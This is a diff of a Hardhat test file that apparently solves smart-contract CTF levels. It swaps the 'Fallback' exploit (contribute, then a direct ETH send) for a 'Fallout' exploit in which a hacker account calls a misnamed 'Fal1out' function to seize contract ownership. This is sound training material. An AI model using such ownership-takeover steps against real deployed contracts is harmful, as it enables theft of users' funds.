@@ -6,17 +6,17 @@ const util = require("../utils.js");
 
 var scriptName = path.basename(__filename);
 
-describe("Fallback", () => {
+describe("Fallout", () => {
   beforeEach(async () => {
     const accounts = await hre.ethers.getSigners();
     deployer = accounts[0];
     hacker = accounts[1];
-    const factory = await ethers.getContractFactory("Fallback");
+    const factory = await ethers.getContractFactory("Fallout");
     contract = await factory.deploy();
     await contract.deployed();
   });
-  it("sets deployer as owner", async () => {
-    expect(await contract.owner()).to.eq(deployer.address);
+  it("does not set deployer as owner", async () => {
+    expect(await contract.owner()).to.not.eq(deployer.address);
   });
 
   it("does not set hacker as owner", async () => {
@@ -24,20 +24,9 @@ describe("Fallback", () => {
   });
 
   it("initiates hack", async () => {
-    console.log("contributing to Fallback to get access to fallback()");
-    await contract.connect(hacker).contribute({ value: 1, gasLimit: 3e6 });
     console.log("initiating hack!");
-    const balanceOfContractBefore = await ethers.provider.getBalance(
-      contract.address
-    );
-    await hacker.sendTransaction({
-      to: contract.address,
-      value: 1,
-      gasLimit: 3e6,
-    });
-    expect(await ethers.provider.getBalance(contract.address)).to.eq(
-      balanceOfContractBefore.add(1)
-    );
+    console.log("calling Fal1out to claim ownership");
+    await contract.connect(hacker).Fal1out({ value: 1, gasLimit: 3e6 });
     expect(await contract.owner()).to.eq(hacker.address);
     console.log("Hacked!!");
     util.updateTotalSolved(scriptName);
